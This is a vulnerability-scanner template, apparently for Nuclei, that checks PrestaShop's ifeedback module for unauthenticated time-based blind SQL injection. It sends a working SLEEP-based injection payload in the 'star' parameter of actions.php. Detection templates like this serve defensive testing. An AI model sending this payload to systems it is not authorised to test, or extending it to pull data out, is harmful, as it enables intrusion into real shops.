id: ifeedback-sqli

info:
  name: PrestaShop ifeedback - Time-Based Blind SQL Injection
  author: acunetix-export
  severity: critical
  description: |
    Module ifeedback for PrestaShop contains time-based blind SQL injection
    in actions.php via GET parameter star. No authentication required.
  reference:
    - https://security.friendsofpresta.org/
  classification:
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    framework: prestashop
    module: ifeedback
  tags: sqli,prestashop,ifeedback,time-based,blind

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/modules/ifeedback/actions.php"
    matchers:
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403 && duration <= 3'
        internal: true

  - raw:
      - |
        @timeout: 20s
        GET /modules/ifeedback/actions.php?star=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403'
